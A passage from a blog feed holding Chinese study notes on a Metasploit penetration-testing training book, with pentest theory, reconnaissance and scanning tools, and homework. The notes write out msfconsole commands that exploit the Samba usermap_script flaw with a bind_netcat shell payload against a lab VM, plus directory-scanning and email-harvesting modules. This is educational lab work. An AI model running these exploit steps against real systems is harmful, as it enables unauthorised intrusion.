&lt;h3&gt;&lt;b&gt;0x01- - Web&lt;/b&gt;&lt;/h3&gt;
&lt;</summary>
      
    
    
    
    <category term="CTF" scheme="http://blog.dvkunion.cn/categories/CTF/"/>
    
    
    <category term="CTF" scheme="http://blog.dvkunion.cn/tags/CTF/"/>
    
    <category term="WP" scheme="http://blog.dvkunion.cn/tags/WP/"/>
    
  </entry>
  
  <entry>
    <title>Metasploit渗透测试魔鬼训练营笔记</title>
    <link href="http://blog.dvkunion.cn/2019/01/30/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E9%AD%94%E9%AC%BC%E8%AE%AD%E7%BB%83%E8%90%A5%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/"/>
    <id>http://blog.dvkunion.cn/2019/01/30/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E9%AD%94%E9%AC%BC%E8%AE%AD%E7%BB%83%E8%90%A5%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/</id>
    <published>2019-01-30T14:30:00.000Z</published>
    <updated>2022-01-05T12:15:59.300Z</updated>
    
    <content type="html"><![CDATA[<h1>Metasploit渗透测试魔鬼训练营渗透笔记</h1><hr><center><small>2019-1-30</small></center><p>日常写点什么<br>寒假开始一周多，想把这本搞了快半年的书彻底的读完。<br>写一个小总结似的笔记，把书里的课后习题和镜像练习实验都一遍。<br>也附带的写一下遇到的坑点和心得吧。<br>调整了一下结构，把每一章的小结都放到了开始部分，希望以后复习时候可以一口气回答出这些问题。<br><br></p><center><small>2019-2-13</small></center><p>读到中间部分感觉这本书还是有点年代感了，有些工具已经不再支持甚至不能够使用了，然而强迫症又想把所有的都做完...很难受。<br>后面部分可能会过的快一点...<br><br></p><center><small>华丽的分割线</small></center><hr><h3><b>第一章</b></h3><p>在这一章主要是介绍 Metasploit 以及渗透测试的基本流程和名词定义。</p><p><b>第一章小结：</b></p><blockquote><p>1.什么是渗透测试?<br>2.渗透测试标准?<br>3.渗透测试流程?<br>4.渗透测试核心?<br>5.Metasploit是什么?<br>6.Metasploit发展史?<br>7.Metasploit主要6模块?<br>8.Metasploit安装和启动?</p></blockquote><p><b>什么是渗透测试?</b><br><b>渗透测试(Penetration Testing)</b>是一种模拟恶意攻击者的技术方法，对安全系统进行测试攻击，取得访问控制权，并发现安全隐患的一种安全测试与评估方法。这些渗透测试者一般称为渗透工程师。</p><p>渗透测试一般分为两种，即<b>黑盒测试</b>和<b>白盒测试</b><br>黑盒测试：设计一个对客户一无所知的渗透攻击<br>白盒测试：拥有客户组织所有知识情况下的渗透测试<br>灰盒测试：将以上两种测试方法结合的渗透测试</p><p><b>安全业界的开源测试手段：</b></p><table><thead><tr><th>名称</th><th>简写</th><th>简述</th></tr></thead><tbody><tr><td>安全测试方法开源手册</td><td>OSSTMM</td><td>提供物理安全、人类心理学、数据网络、无线通信、电讯通信五类渠道的测试用例</td></tr><tr><td>网络安全测试指南</td><td>NIST SP 800-42</td><td>美国国家标准与研究院(NIST)所讨论</td></tr><tr><td>十大web应用安全项目</td><td>OWASP TOP 10</td><td>针对高风险的web领域</td></tr><tr><td>渗透测试执行标准</td><td>PTES</td><td>广泛应用的一个执行标准：<a href="http://www.pentest-standard.org" target="_blank" rel="noopener">http://www.pentest-standard.org</a></td></tr></tbody></table><p><b>渗透测试过程环节：</b></p><table><thead><tr><th>id</th><th>阶段名称</th><th>英文名称</th><th>执行动作</th></tr></thead><tbody><tr><td>1</td><td>前期交互阶段</td><td>Pre-engagement Interactions</td><td>定制渗透测试的范围、目标、限制条件、服务合扩谱图同等</td></tr><tr><td>2</td><td>情报搜集阶段</td><td>Intelligence Gathering</td><td>通过信息搜集获取更大关于目标组织网络拓扑、系统配置等信息</td></tr><tr><td>3</td><td>威胁建模阶段</td><td>Threat Modeling</td><td>通过信息搜集的信息进行讨论分析最可行的攻击手段</td></tr><tr><td>4</td><td>漏洞分析阶段</td><td>Vulnerability Analysis</td><td>寻找漏洞攻击点，进行漏洞的挖掘</td></tr><tr><td>5</td><td>渗透攻击阶段</td><td>Exploitation</td><td>实施渗透攻击获取目标控制权</td></tr><tr><td>6</td><td>后渗透攻击阶段</td><td>Post Exploitation</td><td>总结攻击途径</td></tr><tr><td>7</td><td>报告阶段</td><td>Reporting</td><td>撰写报告，将完整的渗透过程进行总结，并提出补救方案</td></tr></tbody></table><blockquote><p>渗透阶段一般包含7个阶段，由主要核心的5部渗透和开头的服务交互再加上最后的报告。</p></blockquote><p><b>安全漏洞生命周期：</b></p><blockquote><p>A BUG's Life</p></blockquote><p>渗透测试的目的：找出系统中存在的安全漏洞，并实施渗透攻击。<br>安全系统漏洞(Vulnerability)：指信息系统中存在的缺陷或不适当的配置。<br>渗透代码(Exploit)：利用安全漏洞来造成入侵或是破坏效果的程序。<br>安全漏洞的生命周期：<br>1&gt; 安全漏洞研究与挖掘:包括代码审计，逆向工程，Fuzz测试。<br>2&gt; 渗透代码开发与测试:开发验证概念性的代码(POC)，来进行漏洞的验证<br>3&gt; 安全漏洞和渗透代码在封闭团队中流传<br>4&gt; 安全漏洞和渗透代码开始扩散<br>5&gt; 恶意程序出现并传播<br>6&gt; 渗透代码/恶意程序大规模传播并危害互联网<br>7&gt; 渗透攻击代码/攻击工具/恶意程序消亡</p><p>在上述2-5的流程中出现的漏洞一般被称为“0day”<br>恶意程序传播后称作“1day”</p><blockquote><p>要记得什么是0day等...不然根本同不懂大佬门在说什么</p></blockquote><p><b>漏洞披露方式：</b><br>1&gt; 完全公开披露<br>2&gt; 负责人的公开披露<br>3&gt; 进入底下经济产业链<br>4&gt; 小范围利用直至被动披露</p><p><b>漏洞资源库：</b></p><table><thead><tr><th>名称</th><th>地址</th></tr></thead><tbody><tr><td>cnnvd</td><td><a href="http://www.cnnvd.org.cn" target="_blank" rel="noopener">www.cnnvd.org.cn</a></td></tr><tr><td>乌云漏洞库</td><td><a href="http://www.wooyun.org" target="_blank" rel="noopener">www.wooyun.org</a></td></tr><tr><td>metasploit</td><td><a href="http://www.metasploit.com/modules" target="_blank" rel="noopener">www.metasploit.com/modules</a></td></tr><tr><td>Exploit-db</td><td><a href="http://www.exploit-db.com" target="_blank" rel="noopener">www.exploit-db.com</a></td></tr><tr><td>PacketStorm</td><td><a href="http://packetstormsecurity.org" target="_blank" rel="noopener">packetstormsecurity.org</a></td></tr><tr><td>SecurityFocus</td><td><a href="http://www.securityfocus.com/bi" target="_blank" rel="noopener">www.securityfocus.com/bi</a></td></tr><tr><td>SecurityReason</td><td><a href="http://securityreson.com/exploit_alert/" target="_blank" rel="noopener">securityreson.com/exploit_alert/</a></td></tr><tr><td>SecurityVulns</td><td><a href="http://securityvylns.com/exploits/" target="_blank" rel="noopener">securityvylns.com/exploits/</a></td></tr><tr><td>1337days</td><td><a href="http://1337day.com" target="_blank" rel="noopener">1337day.com</a></td></tr></tbody></table><p><b>Metasploit 历史简介：</b></p><p>初级阶段：HD Moore 在 2003 年成立<br>2003年10月，发布了第一个基于Perl的Metaslpoit版本V1.0，仅有11个渗透攻击模块。<br>2004年4月，发布了MetaslpoitV2.0，此时已经包含18个渗透攻击模块和27个攻击载荷模块。<br>2004年8月，在BlackHat大会上发布了MetaslpoitV2.2，进入了飞速发展的时代。<br>2007年5月，进行了长达18个月的代码移植，发布了MetaslpoitV3.0版本，支持177个渗透模块，104个攻击模块以及30个辅助模块。<br>2009年，MetaslpoitV3.3已经发展到796个模块，41.9万行代码。<br>2009年，Metaslpoit被Rapid7收购，之后推出express以及pro版本。<br>2011年8月,MetaslpoitV4.0发布，引入了后渗透模块。</p><p><b>Metasploit框架：</b><br>Metasploit主要由五部分组成。</p><p>1&gt; 基础文件库:位于源码根目录下libraries目录下，有三个部分：rex、framework-core、framework-base。<br>rex：框架的基础组件，如：网络包装套接字、日志系统、PostgreSQL支持等<br>framework-core：负责与上层的模块插件的交互接口<br>framework-base：扩展framework-core，用于调用自身模块和集成模块</p><blockquote><p>我做测试时候使用的是kali自带的metasploit，并没有发现这三个部分的文件，其主目录位于/usr/share/metasploit-frame下。</p></blockquote><p>2&gt; 模块：由Metasploit框架所搭载实行渗透测试功能的部分。主要有6个部分：辅助模块Aux、攻击模块Exploits、后渗透攻击模块Post、攻击载荷模块Payloads、空指令模块Nops、编码器模块Encoders。</p><blockquote><p>模块部分是Metasploit的核心，这六部分模块不在这里做介绍，在后面每部分的使用的时候进行详细的表述。</p></blockquote><p>3&gt; 插件：Metasploit支持外部插件来扩展功能，如Nessus、OpenVas漏洞扫描器插件。<br>4&gt; 接口：Metasploit提供多种外部用户接口，如控制台：msfconsole、命令行：msfcli、图形化界面：msfgui等。</p><blockquote><p>做本章作业的时候发现，msfcli不能使用。bash不存在这个命令。查了一下结果发现msfcli早就已经废弃了...用msfconsole取代。有点坑...<br>贴上原文链接：<a href="https://blog.rapid7.com/2015/07/10/msfcli-is-no-longer-available-in-metasploit/" target="_blank" rel="noopener">https://blog.rapid7.com/2015/07/10/msfcli-is-no-longer-available-in-metasploit/</a></p></blockquote><p>5&gt; 功能程序：除了上述的四部分，Metasploit还提供一系列可执行程序，可以封装攻击荷载、多种类型的解码等。</p><p><b>第一章作业</b><br>1&gt; <font color="Brown">通过搜索引擎、安全信息漏洞库搜索Samba服务usermap_script安全漏洞的相关信息。绘出生命周期图，标注重要时间点。</font></p><blockquote><p>度娘一下，这个漏洞应该是一个非常老旧的漏洞了...我jio着。<br>结果，哇，全是大佬们整理好的...orz...<br>揣摩一遍，还是进到CNNVD来自己看一遍吧...不然这个作业抄上了一点意义都没有了...</p></blockquote><blockquote><p>漏洞名称：Samba用户名映射脚本命令执行<br>漏洞编号：CVE-2007-2447(居然是07年的，这么近...啊也不近了，都2019了...)<br>存在版本：Samba 3.0.0 - Samba 3.0.25rc3<br>简单描述：MS-RPC功能允许远程攻击者在启用“用户名映射脚本”smb.conf选项时，通过涉及SamrChangePassword函数的shell元字符执行任意命令，并允许远程认证用户通过shell元字符执行命令<br><a href="https://imgchr.com/i/k1uVpD" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/01/31/k1uVpD.md.png" class="lazyload" data-srcset="https://s2.ax1x.com/2019/01/31/k1uVpD.md.png" srcset="/css/images/overlay.gif" alt="k1uVpD.md.png"></a></p></blockquote><p>2&gt; <font color="Brown">更新Metasploit，找出攻击模块具体位置，查看一下针对不同系统的攻击模块数量。</font></p><blockquote><p>我所使用的Metaspoit版本为：metasploit v5.0.1-dev<br>总模块数量：aux：1046；exp:1851；post:321；payloads:541:encoders：44；nops:10<br>渗透攻击模块的位置位于：/usr/share/metasploit-framework/modules/<br>进入到exploits，可以发现几个明显的由操作系统命名的文件夹，Shell统计一下：</p></blockquote><p><code># ls -lR | grep &quot;^d&quot; | wc -l</code></p><blockquote><p>关于windows的攻击模块一共有47个。</p></blockquote><p>3&gt; <font color="Brown">分别在Win和Linux下安装Metaspoit，运行并获取Linux靶机usermap_script漏洞渗透攻击，尝试植入VNC图形化远程控制工具的攻击荷载，成功获得Linux靶机上的远程控制桌面。</font></p><blockquote><p>我的win下一直都没有装Metasploit...因为...懒癌...<br>就使用kali下的做一下简单的尝试吧。kali-ip:10.10.10.128<br>靶机为Metasploitable2-ip:10.10.10.254<br>虚拟机内的连接为NAT模式。<br>首先进入msfconsole，使用samba_script模块</p></blockquote><blockquote><p><code>msf5 &gt; use multi/samba/usermap_script</code></p></blockquote><blockquote><p>使用show payloads查看攻击载荷，选定bind_netcat</p></blockquote><blockquote><p><code>msf5 exploit(multi/samba/usermap_script) &gt; set payload cmd/unix/bind_netcat</code></p></blockquote><blockquote><p>使用show options 查看需要设置的参数<br>将IP设置为靶机</p></blockquote><blockquote><p><code>msf5 exploit(multi/samba/usermap_script) &gt; set RHOSTS 10.10.10.254</code></p></blockquote><blockquote><p>exploit!</p></blockquote><blockquote><p>可以看到msf反馈已经成功，等待输出bash命令<br><a href="https://imgchr.com/i/k1KjsJ" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/01/31/k1KjsJ.md.png" class="lazyload" data-srcset="https://s2.ax1x.com/2019/01/31/k1KjsJ.md.png" srcset="/css/images/overlay.gif" alt="k1KjsJ.md.png"></a></p></blockquote><p>4&gt; <font color="Brown">使用msfcli命令行接口写一个SHELL脚本，实现用户只需要输入目标Linux靶机IP就可以使用usermap_script漏洞渗透攻击模块获取远程靶机的shell访问。</font></p><blockquote><p>上面说了msfcli已经被弃用，尝试用上文博客的方法写一个脚本<br>shell的写法还不是很熟练...代码只是简单粗暴的实现了所需功能...运行下过如下<br><a href="https://imgchr.com/i/k1M8yQ" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/01/31/k1M8yQ.md.png" class="lazyload" data-srcset="https://s2.ax1x.com/2019/01/31/k1M8yQ.md.png" srcset="/css/images/overlay.gif" alt="k1M8yQ.md.png"></a><br>贴上代码<br><a href="https://imgchr.com/i/k1MGLj" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/01/31/k1MGLj.md.png" class="lazyload" data-srcset="https://s2.ax1x.com/2019/01/31/k1MGLj.md.png" srcset="/css/images/overlay.gif" alt="k1MGLj.md.png"></a></p></blockquote><h3><b>第二章</b></h3><p>这一章主要搭建后面实现所需要的的网络拓扑环境</p><p><b>第二章小结：</b></p><blockquote><p>1.虚拟机内NAT和网桥的区别?<br>2.怎么配置IP?</p></blockquote><p>这本书需要的镜像总共为5个，统一安装在vm内。</p><table><thead><tr><th>名称</th><th>类型</th><th>模拟功能</th><th>基础操作系统</th><th>域名</th><th>IP</th></tr></thead><tbody><tr><td>Kali(原书使用BackTrack 5)</td><td>Linux攻击机</td><td>初始攻击点主机</td><td>Ubuntu</td><td><a href="http://attacker.dvssc.com" target="_blank" rel="noopener">attacker.dvssc.com</a></td><td>10.10.10.128</td></tr><tr><td>OWASP BWA v0.94</td><td>Web服务靶机</td><td>门户网站服务器</td><td>Ubuntu</td><td><a href="http://www.dvssc.com" target="_blank" rel="noopener">www.dvssc.com</a></td><td>10.10.10.129</td></tr><tr><td>Win2K3 Metasploitable</td><td>Windows靶机</td><td>后台服务器</td><td>Win2K3 En</td><td><a href="http://service.dvssc.com" target="_blank" rel="noopener">service.dvssc.com</a></td><td>10.10.10.130</td></tr><tr><td>Linux Metasploitable</td><td>Linux 靶机</td><td>网关服务器</td><td>Ubuntu 8.04</td><td><a href="http://gate.dvssc.com" target="_blank" rel="noopener">gate.dvssc.com</a></td><td>10.10.10.254(外)/192.168.10.254(内)</td></tr><tr><td>WinXP Metasploitable</td><td>Windows 靶机</td><td>内网客户端主机</td><td>WinXP En</td><td><a href="http://intranet1.dvssc.com" target="_blank" rel="noopener">intranet1.dvssc.com</a></td><td>192.168.10.128</td></tr></tbody></table><p>各个镜像的配置和虚拟机的设置书上已经写得非常详细了，设置好VMnet1和VMnet8两张网卡的网段，再修改每一台主机的IP地址、Host模拟:修改靶机Host将域名和IP相对应。最终检测每一台虚拟机的互相连通性即可。</p><p>网关机192.168.10.254要打开路由转发功能net.ipv4.ip_forward,同时防火墙iptables的设置要正确。</p><p><b>第二章作业</b><br>1&gt; <font color="Brown"> 搭建本章环境，测试连通性</font></p><blockquote><p>这个环境的搭建算是对基础的一个考验，如果网络基础非常好的话修改配置应该会应心得手，很快完成第二章的内容；其次也是对排错能力的一个考验，在实验过程中，由于我的攻击主机使用的kali，在配置网络时候没有注意到CIRD子网掩码二进制的不相同导致网络一直不相同等等问题。<br>总而言之，在这一章主要为后面的实验搭建好良好的环境：工欲善其事，必先利其器。</p></blockquote><p>2&gt; <font color="Brown"> Vmware虚拟机的构建 </font></p><blockquote><p>这个目前还没有办法做到，等遇到了合适的渗透镜像时候会不断的加进来</p></blockquote><h3><b>第三章</b></h3><p>在第三章主要讲了渗透测试的第一个步骤：信息搜集。</p><p><b>第三章小结：</b></p><blockquote><p>1.什么是外围信息收集?<br>2.什么是网络扫描?<br>3.常见的网络扫描有哪些?<br>4.Metasploit有哪些模块适用于信息侦查中?<br>5.Metasploit如何共享信息侦查的数据/成果?</p></blockquote><p>侦查：<br>目标：渗透测试目标的范围，发现渗透目标的安全漏洞与脆弱点，为后续的渗透攻击提供基础。<br>侦查包含：外围信息搜集/公开渠道信息搜集、网络扫描等。</p><h4><font color="blue">3.1 外围信息收集</font><br></h4><p><b>通过DNS和IP的侦查挖掘</b></p><p>1&gt; whois域名注册查询<br>msf内置：whois命令<br>站长之家：<a href="http://whois.chinaz.com" target="_blank" rel="noopener">http://whois.chinaz.com</a><br>2&gt; nslookup/dig 域名查询<br>nslookup:set type=A[MX(Mail Exchange)]<br> ls -d <a href="http://xxxxx.com" target="_blank" rel="noopener">xxxxx.com</a><br>dig @&lt;dns服务器&gt; &lt;域名&gt;<br>3&gt; IP2Location地址查询:www.maxmind.com<br>4&gt; netcraft信息查询：<a href="http://searchdns.netcraft.com" target="_blank" rel="noopener">searchdns.netcraft.com</a><br>http:toolbar.netcraft.com/site_report?url=http://www.testfire.net<br>5&gt; IP2反查域名 <a href="http://site.ip138.com/" target="_blank" rel="noopener">http://site.ip138.com/</a><br>  站长工具 <a href="http://www.7c.com/" target="_blank" rel="noopener">http://www.7c.com/</a></p><blockquote><p>由于这本书出版的年代已经有些久远，所提供的一些工具网址不能够很好地进行运作。能达到同一目的的工具有很多，所以主要是需要了解每一个查询所能获取到哪些有用的信息。<br>whois查询：通过43端口建立tcp连接向服务器进行传送查询请求。这个功能可以查到域名下的DNS服务器、域名备案联系人、联系人邮箱、注册商地址、域名有效时间、注册时间、域名状态等等。同样通过whois反查，可以通过这一个域名所查处的邮箱、联系人、电话等等查到注册该域名的所有者所拥有的其他域名。<br>nslookup&amp;dig：这两个工具在使用的时候没有感觉出多么强大...因为我只看到了对于域名的IP解析...那直接ping一下不就好了么...orz....仔细查了一下，这两个工具更多的适用于dns服务器的查询与测试的...<br>IP2Location：这个就很显而易见了，拿到了域名IP通过IP定位一下服务器所在位置。<br>netcraft：用于子域名查询，在当前的二级域名上可以查询到多少个子域名。<br>IP2Domain：用于查询一台服务器上有多少个虚拟主机，即一个IP上绑定了多少个域名的解析。</p></blockquote><p><b>通过搜索引擎的信息搜集</b></p><p>1&gt; GoogleHacking技术<br>自动化工具：SiteDigger/Search Diggity<br>SiteDigger:<a href="http://www.mcafee.com/us/downloads/free-tools/sitedigger.aspx" target="_blank" rel="noopener">http://www.mcafee.com/us/downloads/free-tools/sitedigger.aspx</a><br>Search Diggity:<a href="http://www.stachliu.com" target="_blank" rel="noopener">http://www.stachliu.com</a></p><blockquote><p>这两个自动化的工具原书的网址全凉了...去搜集一下这两个东西。<br>SiteDigger：安装完了...英文...应该是输入域名然后选择数据库？之后就进行搜索...<br>Search Diggity：原网址变更http://www.bishopfox.com/resources/tools/google-hacking-diggity/attack-tools/ 。 帮助手册都是英文...瞬间就不想看了。<br>还是放上GHDB吧:<a href="https://www.exploit-db.com/google-hacking-database" target="_blank" rel="noopener">https://www.exploit-db.com/google-hacking-database</a></p></blockquote><p>2&gt; 测试网站目录结构<br>google:parent directory site:<br>搜索inc配置文件/bak备份文件/txt或sql数据文件<br>Metasploit:brute_dirs/dir_listing/dir_scanner暴力</p><p><code>use auxiliary/scanner/http/dir_scanner</code><br><code>set THREAD 50</code><br><code>set RHOST xxxxxxxx.com</code><br><code>exploit</code></p><blockquote><p>对于google黑语法我在百度稍微的试了一下，总感觉度娘还是拦截掉了一些东西。没有Google用起来的感觉舒服。<br>对于Metasploit,简单的测试一下：应改和御剑这类工具是一样的，用字典来不断发送请求并对返回的状态码进行统计。只是不知道这个字典和御剑比起来那个更强一点。</p></blockquote><p>3&gt; 检索特定类型文件<br>google:site:xxxx.com file type:xls</p><p>4&gt; 搜索网站中的email地址:</p><p>Metasploit:search_email_collector模块</p><p><code>use auxiliary/gather/search_email_collector</code><br><code>set DOMAIN xxxxxxxx.com</code><br><code>run</code></p><p>5&gt; 搜索sql注入的页面<br>google:site:xxxx.com inurl:login</p><p>纯真数据库:<a href="http://www.cz88.net/" target="_blank" rel="noopener">http://www.cz88.net/</a><br>traceroute</p><h4><font color="blue">3.2 主机探测、端口扫描</font><br></h4><p><b>主机探测：</b></p><p>对网段活跃主机的探测:<br>1.ping</p><p>2.Metasploit 模块<br>modules/auaxiliary/scanner/discovery:arp_sweep、ipv6_multicast、ipv6_neighbor、ipv6_neighbor_route_advertisement、udp_probe、udp_sweep<br>arp_sweep:arp确认网段中活跃主机<br>udp_sweep:udp确认网段中活跃主机并发现服务</p><p>3.Nmap<br>metasploit集成了nmap模块,使用方法不再赘述。</p><p><b>端口扫描：</b></p><p>在Metasploit中：serach postscan可以发现端口扫描工具<br>auxiliary/scanner/portscan/sys、ack、ftpbounce、tcp、xmas</p><p><b>服务扫描：</b></p><p>metasploit：_version/_login<br>e.g. ：http_version查找网络中web服务器。</p><p>也存在着例外：mssql_ping 检测 SQL-server服务(1433)</p><p>常见检测：telnet_version、ssh_version、tnslsnr_version(1521，oracle数据库)、open_proxy(开放代理检测)</p><h4><font color="blue">3.3 口令猜测、嗅探</font><br></h4><p><b>常用嗅探模块：</b></p><p>ssh_login、psnuffle</p><p>ssh_login：auxiliary/scanner/ssh/ssh_login</p><p>psnuffle：auxiliary/sniffer/psnuffle</p><h4><font color="blue">3.4 漏洞扫描</font><br></h4><p>自动化扫描器：nessus、OpenVAS<br>针对性扫描器：nmap<br>这一小结的三个工具放到专门的工具博文下详细记录</p><p><b>OpenVAS</b></p><p>1).配置：<br>1&gt;生成运行所需要的证书文件<br><code># openvas-mkcert -q</code><br><code># openvas-mkcert-client -q</code><br>2&gt; 升级NVT库<br><code># openvas-nvt-sync</code><br>3&gt;初始化<br><code># openvassd</code><br><code># openvasmd --migrate</code><br><code># openvasmd --rebuild</code></p><p><b>Nessus</b></p><p><b>nmap</b></p><p>nmap集成了很多的漏洞扫描脚本，在Kali内的目录为：</p><h4><font color="blue">3.5 信息整理与共享</font><br></h4><p>作为这一章结尾，信息整理与共享的确值得这个重量。良好的习惯和方法能够做到事半功倍的效果。</p><p>Metasploit支持使用数据库的形式导出与导入信息搜集的内容。db_nmap可以直接将nmap的扫描结果存储到数据库中；db_import支持数种格式的扫描结果的导入。</p><p>Metasploit数据库功能需要PostgreSQL的支持，Kali已经内置。</p><p>首先需要启动数据库</p><p><code># service postgresql start</code></p><p>第一次使用数据库时候，需要初始化：</p><p><code># msfdb init</code></p><p>在postgresql中会生成msf和msf_test两表</p><p>进入到msfconsole，输入下列命令查看数据库连接状态：</p><p><code>msf -&gt; db_status</code></p><p>如果初始化数据库这一步正常的话，这里可以直接看到数据库已经连接，连接的是默认的本地msf数据库。</p><p>想要连接其他数据库时，可以使用db_connect进行连接，语法为：</p><p>db_connect 用户名:密码@服务器地址:端口 / 数据库名</p><p><code>msf -&gt; db_connect postgres:password@localhost:7337 / msf</code></p><p>同理可知，db_disconnect 断开连接。</p><p>连接到数据库后，可以使用hosts命令查看数据库是否和已正常使用。</p><p><code>msf -&gt;hosts</code></p><p>一切正常后，我们就可以使用 db_nmap 等封装命令直接将扫描结果储存在数据库中。</p><p>同样也可以将nmap扫描输出的文件使用 db_import 进行查看</p><blockquote><p>笔记：db_import 还可以识别 Acunetix、Amap、Appscan、Burp Session、Microsoft Baseline Security Analyzer 、 Nessus 、 NetSparker、NeXpose 、OpenVAS report、Retina等。<br>基本不认识几个。。。等这个结束以后慢慢补上然后进行测试。</p></blockquote><p>小组共享数据有两种方式，一是通过连接同一个数据库，二是使用MSF RPC数据库。<br>第一种方法需要配置 postgresql 的配置，使其允许远程的数据库连接请求。<br>第二种需要小组其中的一台机器使用 mfsrpcd 命令进行创建，其他小组成员通过GUI进行连接。</p><blockquote><p>此处在未来工作后再进行详细补充</p></blockquote><p><b>第三章作业</b><br>1&gt; <font color="Brown"> 对一个你感兴趣的个人网站进行DNS、IP与位置的信息查询，找出网络运营者的联系方式，宿主服务器与所在位置等信息。撰写一份简单的调查报告</font></p><p>2&gt; <font color="Brown"> 利用搜索引擎或相关工具对 <a href="http://testfire.net" target="_blank" rel="noopener">testfire.net</a> <a href="http://www.dvssc.com" target="_blank" rel="noopener">www.dvssc.com</a> 网站进行更加细致的搜索与侦查，发现更多敏感信息泄露与web安全漏洞 </font></p><p>3&gt; <font color="Brown"> 端口扫描练习：补全表3-1 </font></p><p>4&gt; <font color="Brown"> 漏洞扫描练习：补全表3-3 </font></p><p>5&gt; <font color="Brown"> 数据共享练习：将3、4的扫描结果存储在数据库内 </font></p><h3><b>第四章</b></h3><p>从第四章开始，进入到渗透步骤的攻击阶段，</p><p>第四章主要讲解web方面的攻击。<br>个人感觉第四章是看的最云里雾里的一章...一是所讲工具有些已经不能使用，并且工具的使用讲的较为粗略；二是结构上有点不太适应...感觉没有前几章读起来逻辑性更好一些，实战部分只挑了DVWA的四个样例；webshell代码解析倒是很详细，但是看不懂啊orz...</p><p><b>第四章小结：</b></p><blockquote><p>1.web安全引起重视的原因?<br>2.OWASP 是什么组织?其每年发布的top 10 都有哪些?<br>3.提升:web开源工具了解?<br>4.提升:kali内web安全工具了解?<br>5.通过dvwa/owasp top10 ，对各种web漏洞的原理了解，尝试编写自己的攻击模块?</p></blockquote><p><b>DMZ区：</b><br>DMZ（Demilitarized Zone）即俗称的隔离区或非军事区，与军事区和信任区相对应，作用是把WEB，e-mail，等允许外部访问的服务器单独接在该区端口，使整个需要保护的内部网络接在信任区端口后，不允许任何访问，实现内外网分离，达到用户需求。</p><p><b>web攻击迅速发展的7大理由：</b><br>1.广泛性：web应用存在于广大网络中。<br>2.技术门槛低：Lamp、IIS+ASP、.NET等。<br>3.防火墙策略可绕<br>4.安全机制不够成熟：HTTP发展处于滞后阶段。<br>5.隐蔽性：难以取证。<br>6.变化性：由于业务和服务增加或修改，可能会因为调用不当导致出现验证漏洞。<br>7.利益性：web攻击的利益丰厚</p><p><b>OWASP TOP10:</b><br>1.SQL注入：手注、盲注<br>2.跨站脚本：XSS(Cross-Site Scripting) 分为存储型XSS、反射型XSS、DOM型XSS。<br>3.跨站伪造请求：CSRF(Cross-Site Request Forgery) 是XSS的一种衍生。<br>4.会话认证管理缺陷：BASM(Broken Authenitication and Session Managament) Cookie缺陷。<br>5.安全配置错误：常用服务设置错误。<br>6.不安全的密码存储：例如明文密码，算法key未处理或保护不当。<br>7.不安全的参考对象：读取任意文件或资料。<br>8.限制URL失败：如描述，限制失败。<br>9.缺乏传输层保护：网络传输过程中被监听。缺乏SSL/TLS等保护机制。<br>10.未验证的重定向和跳转</p><p><b>web扫描工具：</b></p><p>Metasploit:辅助模块：auxiliary；渗透模块：exploit。<br>第三方：W3AF、SQLmap、wXf、XSSF、BeEF<br>开源扫描器：W3AF、Arachni、Grabber、Wapiti(sql)、Zed Attack Proxy、Skipfish、Sandcat Free Edithin(xss)、Paros、burpsuite、WATOBO(FUZZ)。</p><p><b>W3AF：</b><br>W3AF(Web Application Attack and Audit Framework)是一个综合性的扫描器。其主要分为核心模块和插件模块。<br>核心模块用于进程调度和插件使用；插件分为八类：发现、审计、搜索、攻击、输出、修改、入侵、破解。<br>W3AF也包含两种工作模式：命令行、GUI<br>同样这里不对工具进行过多赘述。详见W3AF工具讲解。</p><blockquote><p>这个工具的安装搞了我一天的时间...为了这玩意还重装了一下虚拟机...这本书对这个工具的使用不是很多，希望在后面学习使用时物有所值吧...</p></blockquote><p><b>SQLmap：</b><br>SQLmap是一款基于Python2的命令行自动注入工具。Kali自带，这里提一下在Metasploit内使用SQLmap</p><p><code>msf -&gt; use auxiliary/scanner/http/sqlmap</code><br><code>msf (sqlmap) -&gt; show options</code></p><p><b>其他：</b><br>对于书中所讲解的其他几个工具：如wXf(费了好大的力气找到的资源...)、xssf(这个更坑，据说已经停止更新和维护了，对metasploit兼容性越来越差)...由于略微的有一点年代感，在本章练习dvwa和owasp top10 中会学习近些时间比较新的或者更加实用的工具来进行代替。</p><p><b>第四章作业</b><br>1&gt; <font color="Brown"><a href="http://xn--www-855fm2v.testfire.net" target="_blank" rel="noopener">查找www.testfire.net</a> 中存在的sql注入,应用sqlmap等工具或是手动注入</font></p><p>2&gt; <font color="Brown">添加xssf模块，完成一次存储型跨站&quot;钓鱼&quot;</font></p><p>3&gt; <font color="Brown">通过wXf扫描wordpress和joomla两个模块进行RFI攻击</font></p><p>4&gt; <font color="Brown">从exploit-db上找一个wordpress漏洞搭建一个漏洞环境，通过metasploit进行攻击</font></p><p>5&gt; <font color="Brown">在DVWA中实践并理解安全配置及漏洞原理</font></p><p>6&gt; <font color="Brown">尝试使用sqlmap进行shell注入</font></p><p>7&gt; <font color="Brown">尝试向metasploit中加入网上的web渗透模块并搭建测试环境进行测试</font></p><h3><b>第五章</b></h3><p>第五章讲述网络服务的渗透攻击，重点在于对所给实例的漏洞的分析过程的学习，这里和第六章先放一下，涉及了很多的汇编和二进制问题。<br>其主要介绍漏洞有：MS08-067、CVE-2009-1979、OSVDB-59110、</p><p>开始依旧是扫盲。</p><p><b>内存攻击：</b><br>攻击者利用软件安全漏洞构造恶意输入导致软件处理数据产生非预期错误，将数据写入特定的敏感位置从而劫持软件控制流量，执行外部代码。</p><p><b>缓冲区溢出漏洞：</b><br>缓冲区溢出（buffer 